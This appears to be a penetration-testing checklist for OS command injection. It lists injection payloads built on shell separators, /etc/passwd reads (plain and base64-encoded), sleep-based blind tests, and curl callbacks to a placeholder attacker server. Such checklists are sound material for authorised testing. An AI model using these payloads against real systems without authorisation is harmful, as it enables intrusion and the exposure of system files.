1.  **Initial Information Gathering** 
    - [ ] Identify and map all endpoints that accept user input which could be used to execute system commands.
    - [ ] Review source code (if available) to understand how user inputs are handled.
    - [ ] Check for user inputs in URLs, form fields, headers, and request bodies that interact with the operating system.

2.  **Basic Command Injection Testing**
    1. Test with simple command injection payloads to identify vulnerabilities:
        - [ ] `; ls`
        - [ ] `| ls`
        - [ ] `&& ls`
        - [ ] `|| ls`
        - [ ] `$(ls)`

3.  **Advanced Command Injection Techniques**
    1. Test for bypassing input validation and filtering:
        - [ ] `; cat /etc/passwd`
        - [ ] `| cat /etc/passwd`
        - [ ] `&& cat /etc/passwd`
        - [ ] `|| cat /etc/passwd`
        - [ ] `$(cat /etc/passwd)`
    2. Use encoding to bypass filters:
        - [ ] URL encoding: `%3B%20ls`
        - [ ] Double URL encoding: `%253B%2520ls`
        - [ ] Base64 encoding: `Y2F0IC9ldGMvcGFzc3dk`
    3. Test for time delay to identify blind command injection:
        - [ ] `; sleep 10`
        - [ ] `| sleep 10`
        - [ ] `&& sleep 10`
        - [ ] `|| sleep 10`
        - [ ] `$(sleep 10)`

4.  **Out-of-Band (OOB) Command Injection**
    1. Set up an OOB endpoint to detect blind command injection:
        - [ ] `; curl http://[YOUR_SERVER]/ping`
        - [ ] `| curl http://[YOUR_SERVER]/ping`
        - [ ] `&& curl http://[YOUR_SERVER]/ping`
        - [ ] `|| curl http://[YOUR_SERVER]/ping`
        - [ ] `$(curl http://[YOUR_SERVER]/ping)`
        - [ ] `\curl http://[YOUR_SERVER]/ping`
5.  **Command Injection in Different Contexts**
    1. Test command injection in file paths:
        - [ ] `/path/to/file; ls`
        - [ ] `/path/to/file| ls`
        - [ ] `/path/to/file&& ls`
    2. Test command injection in environment variables:
        - [ ] `ENV_VAR="value; ls"`
        - [ ] `ENV_VAR="value| ls"`
        - [ ] `ENV_VAR="value&& ls"`
    3. Test command injection in configuration files:
        - [ ] `config_option=value; ls`
        - [ ] `config_option=value| ls`
        - [ ] `config_option=value&& ls`
        
6.  **Error Handling and Response Analysis**
    - [ ] Analyze server responses for clues about command injection vulnerabilities.
    - [ ] Look for error messages that disclose command execution results or system information.
    - [ ] Verify if application stack traces are exposed in responses.
